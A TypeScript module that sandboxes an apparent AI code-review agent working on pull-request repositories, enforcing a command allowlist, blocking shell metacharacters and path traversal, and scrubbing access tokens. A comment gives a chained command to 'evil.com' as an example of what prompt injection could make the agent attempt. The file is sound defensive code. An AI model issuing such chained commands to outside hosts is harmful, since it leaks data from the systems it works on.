import { getSandbox, type Sandbox, type ExecuteResponse } from "@cloudflare/sandbox";

export const REPO_DIR = "/workspace/repo";

const CLONE_TIMEOUT = 120_000;
const FETCH_TIMEOUT = 60_000;
const COMMAND_TIMEOUT = 30_000;

// Characters that can break out of shell context when interpolated into commands.
// Covers command chaining, subshells, redirects, backticks, variable expansion, and globbing.
const SHELL_METACHAR_RE = /[;|&`$(){}><\n\r\\!"#~]/;

/** Git ref names allow surprisingly many characters. We restrict to a safe subset. */
const SAFE_GIT_REF_RE = /^[a-zA-Z0-9][a-zA-Z0-9._\/-]*$/;

/** Git SHAs: 7-40 hex characters. */
const SAFE_SHA_RE = /^[0-9a-f]{7,40}$/i;

/** Shell-safe single-quote a string: wrap in '' with interior ' escaped. */
function shellQuote(s: string): string {
  return "'" + s.replace(/'/g, "'\\''") + "'";
}

/** Scrub tokens/credentials from URLs in a string (for safe logging). */
function scrubTokens(s: string): string {
  return s.replace(
    /https?:\/\/[^@]*@/g,
    (match) => match.replace(/\/\/.*@/, "//<REDACTED>@"),
  );
}

// Only static-analysis commands allowed. NO test runners (npm test, pytest,
// cargo test, go test, make test, etc.) — those execute attacker-controlled
// code from untrusted PRs. Delegate test execution to CI/CD (GitHub Actions).
export const COMMAND_ALLOWLIST: readonly string[] = [
  // --- Vulnerability audits (read lockfiles, query advisory DBs) ---
  "npm audit",
  "pip-audit",
  "cargo audit",
  "bundle audit",
  "go list -m -json all",
  // --- Static-analysis linters (read files, no code execution) ---
  "python -m ruff",
  "python -m mypy",
  "go vet",
  "cargo clippy",
  "bundle exec rubocop",
  // --- Git (read-only) ---
  "git log",
  "git show",
  "git ls-files",
  "git diff",
  "git branch",
  "git status",
];

export class SandboxError extends Error {
  constructor(
    message: string,
    public readonly command?: string,
    public readonly exitCode?: number,
    public readonly stderr?: string,
  ) {
    super(message);
    this.name = "SandboxError";
  }
}

// --- Timeout wrapper ---

/**
 * Client-side timeout for sandbox.exec(). The SDK passes the timeout to the
 * container, but if the container stops responding the fetch hangs forever.
 * This ensures we always get an answer.
 */
function withTimeout<T>(
  promise: Promise<T>,
  ms: number,
  label: string,
): Promise<T> {
  let timer: ReturnType<typeof setTimeout>;
  const timeout = new Promise<never>((_, reject) => {
    timer = setTimeout(
      () =>
        reject(
          new SandboxError(
            `Client-side timeout after ${ms}ms: ${label}`,
            label,
            -1,
            "Container did not respond within deadline",
          ),
        ),
      ms,
    );
  });
  return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
}

// --- Internal helpers ---

function normalizePath(inputPath: string): string {
  if (inputPath.includes("\0")) {
    throw new SandboxError("Path contains null byte", inputPath);
  }

  const parts = inputPath.split("/");
  const resolved: string[] = [];

  for (const part of parts) {
    if (part === "" || part === ".") continue;
    if (part === "..") {
      resolved.pop();
    } else {
      resolved.push(part);
    }
  }

  return "/" + resolved.join("/");
}

function injectTokenIntoUrl(cloneUrl: string, token: string): string {
  const url = new URL(cloneUrl);
  url.username = "x-access-token";
  url.password = token;
  return url.toString();
}

async function execOrThrow(
  sandbox: DurableObjectStub<Sandbox>,
  command: string,
  options?: { cwd?: string; timeout?: number },
): Promise<ExecuteResponse> {
  const timeout = options?.timeout ?? COMMAND_TIMEOUT;
  const result = await withTimeout(
    sandbox.exec(command, { cwd: options?.cwd ?? REPO_DIR, timeout }),
    timeout + 10_000,
    scrubTokens(command),
  );

  if (!result.success) {
    throw new SandboxError(
      `Command failed (exit ${result.exitCode}): ${scrubTokens(command)}\n${scrubTokens(result.stderr)}`,
      scrubTokens(command),
      result.exitCode,
      scrubTokens(result.stderr),
    );
  }

  return result;
}

// --- Public API ---

export function getSandboxForRepo(
  ns: DurableObjectNamespace<Sandbox>,
  repoFullName: string,
): DurableObjectStub<Sandbox> {
  const sandboxId = repoFullName.replaceAll("/", "--");
  return getSandbox(ns, sandboxId);
}

export async function setupRepo(
  sandbox: DurableObjectStub<Sandbox>,
  cloneUrl: string,
  headRef: string,
  headSha: string,
  token: string,
): Promise<{ cloned: boolean; duration: number }> {
  // Validate inputs before any shell interpolation
  if (!SAFE_GIT_REF_RE.test(headRef)) {
    throw new SandboxError(`Invalid branch name: ${headRef}`);
  }
  if (!SAFE_SHA_RE.test(headSha)) {
    throw new SandboxError(`Invalid SHA: ${headSha}`);
  }

  const start = Date.now();
  const authenticatedUrl = injectTokenIntoUrl(cloneUrl, token);
  const quotedUrl = shellQuote(authenticatedUrl);

  // Check if repo is already cloned (warm sandbox)
  const check = await withTimeout(
    sandbox.exec("git rev-parse --is-inside-work-tree", { cwd: REPO_DIR, timeout: 5_000 }),
    15_000,
    "git rev-parse --is-inside-work-tree",
  );

  if (check.success && check.stdout.trim() === "true") {
    // Warm path: update remote URL with fresh token, fetch the specific branch, checkout
    await execOrThrow(sandbox, `git remote set-url origin ${quotedUrl}`, {
      timeout: 5_000,
    });

    // Fetch the specific branch — plain `git fetch origin` may not fetch PR branches
    const branchFetch = await withTimeout(
      sandbox.exec(
        `git fetch origin +refs/heads/${headRef}:refs/remotes/origin/${headRef}`,
        { cwd: REPO_DIR, timeout: FETCH_TIMEOUT },
      ),
      FETCH_TIMEOUT + 10_000,
      "git fetch origin (branch)",
    );

    if (branchFetch.success) {
      await execOrThrow(sandbox, `git checkout -B ${headRef} origin/${headRef}`, {
        timeout: FETCH_TIMEOUT,
      });
    } else {
      // Branch not on remote (e.g. fork PR, deleted branch) — fetch by SHA
      await execOrThrow(sandbox, `git fetch origin ${headSha}`, {
        timeout: FETCH_TIMEOUT,
      });
      await execOrThrow(sandbox, `git checkout -B ${headRef} ${headSha}`, {
        timeout: FETCH_TIMEOUT,
      });
    }

    await execOrThrow(sandbox, `git reset --hard HEAD`, { timeout: 10_000 });
    await execOrThrow(sandbox, "git clean -fd", { timeout: 10_000 });
  } else {
    // Cold path: fresh clone
    await execOrThrow(
      sandbox,
      `git clone --depth=50 ${quotedUrl} ${REPO_DIR}`,
      { cwd: "/workspace", timeout: CLONE_TIMEOUT },
    );
    // Checkout the PR branch (may already be the default branch)
    const checkout = await withTimeout(
      sandbox.exec(`git checkout ${headRef}`, { cwd: REPO_DIR, timeout: FETCH_TIMEOUT }),
      FETCH_TIMEOUT + 10_000,
      `git checkout ${headRef}`,
    );
    // If checkout fails, fetch by SHA (works for forks, deleted branches, etc.)
    if (!checkout.success) {
      await execOrThrow(sandbox, `git fetch origin ${headSha}`, {
        timeout: FETCH_TIMEOUT,
      });
      await execOrThrow(sandbox, `git checkout -B ${headRef} ${headSha}`, {
        timeout: FETCH_TIMEOUT,
      });
    }
  }

  // Strip the token from the remote URL so user-controlled code (npm test, etc.)
  // cannot read it via `git remote get-url origin`.
  const publicUrl = cloneUrl.replace(/^http:/, "https:");
  await execOrThrow(sandbox, `git remote set-url origin ${shellQuote(publicUrl)}`, {
    timeout: 5_000,
  });

  const cloned = !(check.success && check.stdout.trim() === "true");
  return { cloned, duration: Date.now() - start };
}

export async function readFile(
  sandbox: DurableObjectStub<Sandbox>,
  path: string,
): Promise<string> {
  const normalized = normalizePath(path);

  if (!normalized.startsWith(REPO_DIR + "/")) {
    throw new SandboxError(`Path traversal blocked: ${path}`);
  }

  try {
    const response = await withTimeout(
      sandbox.readFile(normalized),
      COMMAND_TIMEOUT + 10_000,
      `readFile(${path})`,
    );

    if (!response.success) {
      throw new SandboxError(`Failed to read file: ${path}`);
    }

    return response.content;
  } catch (err) {
    if (err instanceof SandboxError) throw err;
    throw new SandboxError(
      `Failed to read file: ${path} (${err instanceof Error ? err.message : String(err)})`,
    );
  }
}

export async function runCommand(
  sandbox: DurableObjectStub<Sandbox>,
  command: string,
  cwd?: string,
): Promise<ExecuteResponse> {
  const trimmed = command.trim();

  // Reject shell metacharacters anywhere in the command to prevent chaining
  // (e.g. `git log ; curl evil.com`). Individual helpers like searchContent
  // build safe commands internally; this blocks the agent from being tricked
  // via prompt injection into crafting dangerous commands.
  if (SHELL_METACHAR_RE.test(trimmed)) {
    throw new SandboxError(`Command contains forbidden characters: ${trimmed}`);
  }

  const isAllowed = COMMAND_ALLOWLIST.some(
    (prefix) => trimmed === prefix || trimmed.startsWith(prefix + " "),
  );

  if (!isAllowed) {
    throw new SandboxError(`Command not allowed: ${trimmed}`);
  }

  // Resolve cwd: validate and join with REPO_DIR
  let execCwd = REPO_DIR;
  if (cwd) {
    // Block path traversal and shell metacharacters
    if (cwd.includes("..") || cwd.includes("\0") || SHELL_METACHAR_RE.test(cwd)) {
      throw new SandboxError(`Invalid cwd: ${cwd}`);
    }
    execCwd = `${REPO_DIR}/${cwd.replace(/^\/+/, "")}`;
  }

  const timeout = COMMAND_TIMEOUT;

  return withTimeout(
    sandbox.exec(trimmed, { cwd: execCwd, timeout }),
    timeout + 10_000,
    trimmed,
  );
}

export async function listFiles(
  sandbox: DurableObjectStub<Sandbox>,
  pattern?: string,
): Promise<string[]> {
  if (pattern && /[;|&`$()\\]/.test(pattern)) {
    throw new SandboxError(`Invalid pattern: ${pattern}`);
  }

  const command = pattern
    ? `git ls-files -- ${shellQuote(pattern)}`
    : "git ls-files";

  const result = await execOrThrow(sandbox, command, { timeout: 10_000 });

  return result.stdout.split("\n").filter((line: string) => line.length > 0);
}

export async function gitDiff(
  sandbox: DurableObjectStub<Sandbox>,
  baseSha: string,
): Promise<string> {
  if (!/^[0-9a-f]{7,40}$/i.test(baseSha)) {
    throw new SandboxError(`Invalid SHA: ${baseSha}`);
  }

  const result = await execOrThrow(sandbox, `git diff ${baseSha}...HEAD`, {
    timeout: COMMAND_TIMEOUT,
  });

  return result.stdout;
}

export async function searchContent(
  sandbox: DurableObjectStub<Sandbox>,
  pattern: string,
  options?: { glob?: string; caseSensitive?: boolean; maxResults?: number },
): Promise<string> {
  // shellQuote wraps values in single quotes, which prevents all shell injection.
  // We only block null bytes and overly long patterns (DoS).
  if (pattern.includes("\0") || pattern.length > 500) {
    throw new SandboxError(`Invalid search pattern: ${pattern.slice(0, 100)}`);
  }
  if (options?.glob && (options.glob.includes("\0") || options.glob.length > 200)) {
    throw new SandboxError(`Invalid glob filter: ${options.glob.slice(0, 100)}`);
  }

  // Use git grep instead of rg — it's always available (no extra install),
  // only searches tracked files (inherently respects .gitignore), and uses
  // git's index so it's fast even in large repos.
  const parts = [
    "git", "grep", "-n", "--no-color",
    "-E", // extended regex
  ];

  if (!options?.caseSensitive) {
    parts.push("-i");
  }

  parts.push("-e", shellQuote(pattern));

  if (options?.glob) {
    parts.push("--", shellQuote(options.glob));
  }

  const command = parts.join(" ");
  // git grep returns exit 1 for "no matches" — that's not an error.
  const result = await withTimeout(
    sandbox.exec(command, { cwd: REPO_DIR, timeout: COMMAND_TIMEOUT }),
    COMMAND_TIMEOUT + 10_000,
    command,
  );

  if (result.exitCode === 1 && !result.stderr) {
    return ""; // no matches
  }
  if (result.exitCode > 1) {
    throw new SandboxError(
      `Search failed: ${result.stderr}`,
      command,
      result.exitCode,
      result.stderr,
    );
  }

  return result.stdout;
}

export async function findFiles(
  sandbox: DurableObjectStub<Sandbox>,
  pattern: string,
  options?: { type?: "f" | "d"; maxDepth?: number },
): Promise<string[]> {
  if (pattern.includes("\0") || pattern.length > 200) {
    throw new SandboxError(`Invalid find pattern: ${pattern.slice(0, 100)}`);
  }

  const maxDepth = Math.min(options?.maxDepth ?? 10, 15);
  const parts = ["find", ".", `-maxdepth ${maxDepth}`];

  if (options?.type) {
    parts.push(`-type ${options.type}`);
  }

  parts.push(`-name ${shellQuote(pattern)}`);

  // Call sandbox.exec directly — this helper validates its own inputs.
  const command = parts.join(" ");
  const result = await withTimeout(
    sandbox.exec(command, { cwd: REPO_DIR, timeout: COMMAND_TIMEOUT }),
    COMMAND_TIMEOUT + 10_000,
    command,
  );

  if (result.exitCode !== 0) {
    throw new SandboxError(
      `Find failed: ${result.stderr}`,
      command,
      result.exitCode,
      result.stderr,
    );
  }

  return result.stdout.split("\n").filter((line: string) => line.length > 0);
}
